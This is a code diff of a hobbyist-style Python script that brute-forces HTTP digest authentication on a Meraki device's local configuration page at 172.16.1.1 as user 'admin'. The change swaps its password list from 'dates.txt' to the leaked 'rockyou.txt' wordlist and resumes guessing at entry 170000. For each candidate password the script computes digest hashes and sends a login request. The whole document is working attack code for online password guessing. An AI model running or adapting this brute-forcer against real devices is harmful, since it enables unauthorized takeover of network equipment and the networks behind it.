@@ -13,7 +13,8 @@ url4 = 'http://172.16.1.1/configure/index.cgi'
 
 # customizable, don't know how to read headers and extract these on the fly because they're not json or dictionaries
 user = 'admin'
-realm = 'Meraki Manual Configuration. The login is \'admin\' and the password has been administratively configured on Meraki Dashboard.'
+realm = 'Meraki Manual Configuration. The login is \'admin\' and the password has been administratively configured on ' \
+        'Meraki Dashboard. '
 qop = 'auth'
 
 nc = 1
@@ -24,15 +25,15 @@ nonce = r.headers['WWW-Authenticate'][180:-13]
 # print(nonce)
 
 # fresh off the stack overflow griddle
-with open('dates.txt') as file:
+with open('rockyou.txt', encoding='ansi') as file:
     # tf is list comprehension?
     passwords = [line.rstrip() for line in file]
-
+print('List loaded')
 # manual progress tracking, I know
-total = 0
+total = 170000
 
 # make a request with each password, starting at the last one logged
-for i in range(total, len(passwords)):
+for i in range(total+1, len(passwords)):
     # too easy
     cnonce = hash.new_cnonce()
     h1 = hash.hash1(user, realm, passwords[i])
@@ -58,7 +59,7 @@ for i in range(total, len(passwords)):
     # decreases the wall of spam, at the cost of not being able to see the status code for each request
     # print(request.request.headers)
     if i % 100 == 0:
-        print(f'{i}, ', end='')
+        print(f'{i}')
     # print(f'{i}:{request.status_code}, ', end='')
 
 # r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
